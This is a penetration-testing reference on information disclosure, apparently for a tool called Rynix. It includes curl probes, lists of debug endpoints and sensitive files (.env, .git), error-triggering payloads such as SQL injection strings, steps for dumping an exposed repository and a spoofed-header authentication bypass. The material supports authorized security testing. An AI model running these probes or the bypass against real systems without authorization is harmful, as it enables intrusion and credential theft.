---
id: PS-INFO
category: Information disclosure
lab_count: 5
wstg_refs: [WSTG-INFO-05, WSTG-ERRH-01, WSTG-ERRH-02]
---

# Information Disclosure: Attack Technique Reference

Information disclosure occurs when an application unintentionally reveals sensitive data to users who should not have access to it. This includes technical details (stack traces, database structure, internal IPs, framework versions), credentials (API keys, database passwords, session tokens), source code, and personally identifiable information. While some disclosures are directly exploitable, others serve as building blocks that enable more severe attacks -- a leaked framework version reveals applicable CVEs, a database error confirms SQL injection, and an exposed internal IP enables SSRF targeting.

---

## 1. Detection

### 1A. Passive Discovery

Examine every response for inadvertent information leakage during normal crawling:

```
# Inspect response headers for version information
curl -sk -D- https://target.com/ | head -30

# Common revealing headers:
# Server: Apache/2.4.52 (Ubuntu)
# X-Powered-By: PHP/8.1.2
# X-AspNet-Version: 4.0.30319
# X-Generator: Drupal 10
# X-Debug-Token: abc123
# X-Runtime: 0.042
```

**HTML source inspection targets:**
- Developer comments: `<!-- TODO: remove before production -->`, `<!-- DEBUG: user_id=42 -->`
- Hidden form fields with sensitive defaults: `<input type="hidden" name="debug" value="true">`
- Inline JavaScript containing API endpoints, tokens, or configuration objects
- Source map references: `//# sourceMappingURL=app.js.map`
- Meta tags with generator info: `<meta name="generator" content="WordPress 6.4">`

### 1B. Active Probing

Deliberately trigger errors and explore debug functionality:

```
# Trigger errors with invalid input types
curl -sk 'https://target.com/api/user/not-a-number'
curl -sk 'https://target.com/product?id=AAAA'
curl -sk 'https://target.com/search?q=' -X POST -d ''

# Request non-existent resources to see error page templates
curl -sk 'https://target.com/nonexistent-path-12345'
curl -sk 'https://target.com/api/v99/users'

# HTTP method probing
curl -sk -X TRACE https://target.com/
curl -sk -X OPTIONS https://target.com/
curl -sk -X DEBUG https://target.com/
```

### 1C. Automated Scanning

```
# template-scan info disclosure templates
rynix_plugin_run('wstg') rynix-http-probe -u https://target.com -t exposures/ -t misconfiguration/ -o template-scan-info.txt

# Check for common disclosure files
rynix_plugin_run('wstg') fuzz-cli -u https://target.com/FUZZ -w /app/wordlists/info-disclosure.txt -mc 200,403 -o info-files.json

# tech-fingerprint-cli fingerprinting
rynix_plugin_run('wstg') tech-fingerprint-cli -a 3 https://target.com
```

---

## 2. Techniques

### 2A. Error Message Exploitation

Trigger verbose error messages by submitting unexpected input. Error handlers frequently expose internal system details that developers intended only for debugging.

**Input manipulation for error triggering:**
```
# Type confusion — submit string where integer expected
GET /api/product?id=abc HTTP/1.1
# Response may reveal: "java.lang.NumberFormatException: For input string: \"abc\""

# Oversized input — exceed buffer/field length limits
GET /search?q=AAAAAAA....[10000 chars] HTTP/1.1
# May trigger stack trace with internal class paths

# Special characters — break parsers
GET /api/user?name=<>'"`;{}[] HTTP/1.1
# SQL errors reveal database type and query structure

# Missing required parameters
POST /api/login HTTP/1.1
Content-Type: application/json
{}
# May reveal expected parameter names in error message

# Null bytes and encoding errors
GET /page?file=test%00.txt HTTP/1.1
# May reveal file system paths in error messages

# Division by zero / arithmetic edge cases
GET /calculate?amount=0&divisor=0 HTTP/1.1
```

**What to extract from error messages:**
- Database type and version (MySQL, PostgreSQL, Oracle, MSSQL)
- SQL query fragments showing table/column names
- Internal file system paths (`/var/www/html/app/controllers/UserController.php`)
- Framework and language versions
- Stack traces with class names and method calls
- Third-party library versions with potential CVEs

> Lab refs: PS-INFO-01

### 2B. Debug Pages and Diagnostic Endpoints

Debug features left enabled in production expose detailed application internals including environment variables, database credentials, and session data.

**Common debug endpoints to probe:**
```
# PHP
/phpinfo.php
/cgi-bin/phpinfo.php
/info.php
/php_info.php
/test.php

# Python / Django
/__debug__/
/_debugbar/
/debug/default/view
/debug/pprof/
/__debug__/sql/select/

# Java / Spring
/actuator
/actuator/env
/actuator/health
/actuator/beans
/actuator/configprops
/actuator/mappings
/actuator/heapdump
/env
/trace
/jolokia

# Ruby on Rails
/rails/info/routes
/rails/info/properties
/rails/mailers

# ASP.NET
/elmah.axd
/trace.axd
/Trace.axd

# Node.js
/debug
/status
/_debug
/health

# General
/server-status       (Apache mod_status)
/server-info         (Apache mod_info)
/nginx_status        (Nginx stub_status)
/.env                (Environment file)
/config
/console             (Rails, Werkzeug)
```

**What debug pages reveal:**
- `phpinfo()`: Full server configuration, loaded modules, environment variables, `$_SERVER` vars, file paths
- Spring Actuator `/env`: All environment variables including database URLs, API keys, secrets
- Django debug: SQL queries, template context, request/response data
- Werkzeug debugger: Interactive Python console (RCE if PIN is guessable)

```
# Test for Spring Boot Actuator endpoints
for endpoint in env health beans configprops mappings trace info metrics httptrace; do
  code=$(curl -sk -o /dev/null -w '%{http_code}' "https://target.com/actuator/$endpoint")
  echo "$endpoint: $code"
done
```

> Lab refs: PS-INFO-02

### 2C. Source Code via Backup Files

Text editors, IDEs, and deployment processes create backup copies of source files. These copies are served as raw text rather than being executed by the application server.

**Editor backup file patterns:**
```
# Common backup extensions to check for each discovered source file
/index.php~           # Vim/Emacs backup
/index.php.bak        # Manual backup
/index.php.old        # Manual backup
/index.php.orig       # Git merge conflict original
/index.php.save       # Nano backup
/index.php.swp        # Vim swap file
/.index.php.swp       # Vim hidden swap file
/index.php.swo        # Vim second swap
/index.php.tmp        # Temporary file
/index.php.dist       # Distribution copy
/index.php.copy       # Manual copy
/index.php.1          # Numbered backup
```

**IDE and deployment artifacts:**
```
# IDE project files
/.idea/               # JetBrains (IntelliJ, PyCharm, WebStorm)
/.vscode/             # VS Code settings, launch configs
/.project             # Eclipse
/.classpath           # Eclipse Java
/nbproject/           # NetBeans

# Build artifacts
/WEB-INF/web.xml      # Java web app config
/WEB-INF/classes/     # Compiled Java classes
/META-INF/            # Java metadata

# Environment and config files
/.env                 # Environment variables (DB creds, API keys)
/.env.local           # Local environment overrides
/.env.production      # Production environment (sometimes deployed)
/.env.backup          # Environment backup
/config.yml           # Application config
/database.yml         # Database credentials (Rails)
/settings.py          # Django settings
/wp-config.php        # WordPress database credentials
/web.config           # IIS configuration
/appsettings.json     # .NET configuration
```

**Systematic testing:**
```
# For each known source file path, test backup variants
for ext in '~' .bak .old .orig .save .swp .tmp .dist .copy; do
  code=$(curl -sk -o /dev/null -w '%{http_code}' "https://target.com/index.php${ext}")
  echo "${ext}: ${code}"
done
```

> Lab refs: PS-INFO-03

### 2D. Authentication Bypass via Information Disclosure

Disclosed information can directly enable authentication bypass or privilege escalation.

**TRACE method revealing custom auth headers:**
```
TRACE / HTTP/1.1
Host: target.com

# Response echoes back the full request including headers added by reverse proxies:
# X-Custom-IP-Authorization: 127.0.0.1
# X-Forwarded-User: admin
# X-Auth-Token: secret-internal-token
```

If a reverse proxy adds authentication headers (e.g., `X-Custom-IP-Authorization`) and the application trusts them, an attacker can add these headers directly to bypass authentication:

```
GET /admin HTTP/1.1
Host: target.com
X-Custom-IP-Authorization: 127.0.0.1
```

**Other disclosed data enabling auth bypass:**
- Hardcoded API keys in JavaScript files or error messages
- Admin credentials in debug pages or configuration files
- Session tokens leaked in URL parameters or Referer headers
- Internal endpoints discovered via source maps or comments

> Lab refs: PS-INFO-04

### 2E. Version Control Exposure

Exposed `.git`, `.svn`, or `.hg` directories allow downloading the complete source code repository including commit history, which may contain secrets removed in later commits.

**Detection:**
```
# Check for exposed .git directory
curl -sk -o /dev/null -w '%{http_code}' https://target.com/.git/HEAD
# 200 → .git is accessible

curl -sk -o /dev/null -w '%{http_code}' https://target.com/.git/config
# 200 → can read git configuration

# Check for .svn
curl -sk -o /dev/null -w '%{http_code}' https://target.com/.svn/entries
curl -sk -o /dev/null -w '%{http_code}' https://target.com/.svn/wc.db

# Check for .hg
curl -sk -o /dev/null -w '%{http_code}' https://target.com/.hg/store/
```

**Exploitation -- downloading the repository:**
```
# Tool: git-dumper (downloads entire .git directory and reconstructs repo)
rynix_plugin_run('wstg') git-dumper https://target.com/.git/ /tmp/repo-dump/

# Manual extraction if directory listing is enabled:
curl -sk https://target.com/.git/HEAD
# ref: refs/heads/main

curl -sk https://target.com/.git/refs/heads/main
# <commit-hash>

curl -sk https://target.com/.git/objects/<first2>/<remaining38>
# Raw git object (decompress with zlib)

# After downloading: search git history for secrets
cd /tmp/repo-dump
git log --all --oneline
git diff HEAD~5 HEAD
git log -p --all -S 'password'
git log -p --all -S 'api_key'
git log -p --all -S 'secret'
```

**What to look for in version control history:**
- Credentials committed then removed in later commits
- Configuration files with database connection strings
- API keys and tokens
- Internal documentation
- Code changes revealing vulnerability patches (shows what was vulnerable)

> Lab refs: PS-INFO-05

---

## 3. Common Disclosure Locations

### 3A. Response Headers

| Header | Information Leaked |
|--------|-------------------|
| `Server` | Web server name and version |
| `X-Powered-By` | Application framework and version |
| `X-AspNet-Version` | ASP.NET version |
| `X-Generator` | CMS name and version |
| `X-Debug-Token` | Symfony debug profiler token |
| `X-Request-ID` | Internal request tracing ID |
| `X-Runtime` | Request processing time (timing attacks) |
| `X-Forwarded-For` | Internal proxy IPs (when echoed back) |
| `Via` | Proxy server details |

### 3B. Common Sensitive Files

```
# Credential and configuration files
/.env
/config.php
/configuration.php
/wp-config.php
/database.yml
/settings.py
/appsettings.json
/web.config
/config/database.yml

# Discovery and crawler files
/robots.txt           # Lists restricted paths → reveals hidden endpoints
/sitemap.xml          # Lists all pages → reveals application structure
/crossdomain.xml      # Flash cross-domain policy → reveals trusted domains
/clientaccesspolicy.xml  # Silverlight cross-domain → reveals trusted domains
/.well-known/security.txt  # Security contact and policy info

# Documentation and API specs
/swagger.json
/swagger-ui.html
/api-docs
/openapi.json
/graphql (introspection)
/v2/api-docs (Spring)

# Logs and diagnostics
/error.log
/access.log
/debug.log
/logs/
```

### 3C. HTML and JavaScript Sources

```
# Source map files (expose original unminified source code)
/static/js/app.js.map
/assets/main.js.map
# Discovered via: //# sourceMappingURL=<file>.map in JS files

# Inline configuration objects
# Search JS responses for:
# window.__CONFIG__ = {apiKey: "...", endpoint: "..."}
# const config = {secret: "...", dbUrl: "..."}

# HTML comments
# <!-- Database: mysql://user:pass@localhost/db -->
# <!-- TODO: Remove admin backdoor at /admin?debug=true -->
# <!-- API endpoint: https://internal-api.corp.com/v2 -->
```

---

## 4. Sensitive Information Types

### Severity Classification

| Information Type | Severity | Why It Matters |
|-----------------|----------|---------------|
| Database credentials | Critical | Direct database access |
| API keys / tokens | Critical | Service impersonation, data access |
| Admin passwords | Critical | Full application control |
| Session tokens (in URL/logs) | High | Session hijacking |
| Internal IP addresses | Medium | SSRF targeting, network mapping |
| Stack traces / file paths | Medium | Attack surface mapping, vulnerability identification |
| Framework / CMS version | Low-Medium | CVE lookup for known vulnerabilities |
| Database table/column names | Medium | Targeted SQL injection |
| Source code | High | Complete vulnerability analysis |
| Email addresses | Low | Social engineering, account enumeration |
| User PII | High | Privacy violation, regulatory impact |

---

## 5. Testing Checklist

### Per-Endpoint Information Disclosure Assessment

For every discovered endpoint, systematically check:

- [ ] **Response headers**: Server, X-Powered-By, X-Debug, custom headers
- [ ] **Error triggering**: Invalid types, missing params, oversized input, special characters
- [ ] **HTTP methods**: TRACE, OPTIONS, DEBUG, PUT, DELETE -- check for unexpected responses
- [ ] **Backup files**: For each source file, test `~`, `.bak`, `.old`, `.swp`, `.orig` variants
- [ ] **Debug endpoints**: `/debug`, `/actuator`, `/phpinfo`, `/__debug__/`, framework-specific
- [ ] **Configuration files**: `.env`, config files, database configs for the identified tech stack
- [ ] **Version control**: `/.git/HEAD`, `/.svn/entries`, `/.hg/store/`
- [ ] **API documentation**: `/swagger.json`, `/api-docs`, GraphQL introspection
- [ ] **Source maps**: Check every JavaScript file for `sourceMappingURL` references
- [ ] **HTML comments**: Grep page source for `<!--` and developer notes
- [ ] **JavaScript globals**: Check for `window.__CONFIG__`, `window.__STATE__`, inline credentials

### Error Triggering Matrix

| Technique | Payload | Expected Disclosure |
|-----------|---------|-------------------|
| Type mismatch | `?id=abc` (where int expected) | Stack trace, language/framework version |
| Missing parameter | Remove required field | Error listing expected params |
| Oversized input | 10000+ character string | Buffer handling error with paths |
| Null byte | `?file=test%00.txt` | File system path, OS info |
| Unicode | `?name=%c0%ae` | Encoding error with internal details |
| JSON malformation | `{"unclosed":` | Parser error with library info |
| XML/XXE probe | `<?xml version="1.0"?><!DOCTYPE x>` | XML parser details |
| SQL syntax | `' OR 1=1--` | Database error type, query structure |
## Rynix workflow

1. `get_technique_guide` for `information-disclosure` — confirm test objectives.
2. `scope_check` + `register_scope` for the target host.
3. Static pass: `analyze_repo`, `rbac_matrix`, `high_risk_surfaces`.
4. Dynamic pass: `http_probe`, `analyze_repo`.
5. `record_finding` with probe evidence; `track_wstg_test` when mapped.

## Rynix tooling

- `http_probe`
- `analyze_repo`

## Evidence requirements

- Reproducible request/response or role-comparison diff.
- Session ID on all live tool calls.
- Link findings to endpoint + parameter, not generic claims.

## ASVS mapping

- V4 Access Control — role-appropriate responses for protected resources.
- V5 Validation — input handling for injection and parser differentials.

## CWE references

- CWE-284: Improper Access Control
- CWE-20: Improper Input Validation
## GenAI / LLM 2026 notes

- Cross-reference `knowledge/custom/genai_llm_security_2026.md` (OWASP LLM Top 10 mapping).
- Probe AI endpoints with `http_probe` only — no external LLM API keys in Rynix runtime.
- Use `compare_role_response` to detect cross-tenant prompt/response leakage.
- Map findings to LLM01–LLM10 categories in `export_report`.

